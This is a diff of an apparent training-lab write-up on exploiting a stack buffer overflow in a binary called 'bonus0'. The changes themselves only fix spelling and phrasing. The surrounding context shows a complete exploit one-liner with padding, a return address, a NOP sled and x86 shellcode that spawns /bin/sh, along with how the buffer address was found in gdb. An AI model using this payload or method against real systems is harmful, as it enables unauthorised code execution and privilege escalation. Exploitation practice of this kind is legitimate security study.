@@ -25,7 +25,7 @@ first input string: 20 padding chars;
 second string: 9 padding + adress of shellcode + shellcode
 
 We still need to find the adress of our shellcode.
-As it is on the read buffer, it's adress is the adress of the buffer + 9 + 4 (padding + adress)
+As it is on the read buffer, it's adress is the adress of the buffer + 13 (size of padding + adress, 9 + 4)
 
 To find the adress of the buffer we break just before the read instruction and we examine the stack to see the arguments passed to it:
 
@@ -47,5 +47,5 @@ type: aaaabbbb
 
 (echo "xxxxxxxxxxxxxxxxxxxx"; python -c "print 'x' * 9 + '\xbd\xe6\xff\xbf' + '\x90' * 100 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") | /home/user/bonus0/bonus0
 
-I had some problems running this exploit outside gdb, env variables/argv seems to be different no matter what i tried (unset env ...)
-I hadded a nopsled (some \x90 before the shellcode) and it worked well.
+I had some problems running this exploit outside of gdb, env variables/argv seems to be different no matter what i tried (unset env ...)
+I added a nopsled (some \x90 before the shellcode) and it worked well.
